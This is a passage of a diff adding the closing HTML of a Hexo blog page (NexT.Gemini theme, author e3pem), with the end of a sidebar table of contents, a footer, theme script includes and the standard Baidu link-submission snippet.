class="nav-number">1.7.</span> <span class="nav-text">参考链接</span></a></li></ol></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2019</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">e3pem</span>
+
+  
+</div>
+
+
+  <div class="powered-by">由 <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> 强力驱动</div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">主题 &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Gemini</a> v5.1.3</div>
+
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.3"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.3"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=5.1.3"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.3"></script>
+
+
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.3"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.3"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.3"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+<script>
+(function(){
+    var bp = document.createElement('script');
+    var curProtocol = window.location.protocol.split(':')[0];
+    if (curProtocol === 'https') {
+        bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';        
+    }
+    else {
+        bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+    }
+    var s = document.getElementsByTagName("script")[0];
+    s.parentNode.insertBefore(bp, s);
+})();
+</script>
+
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
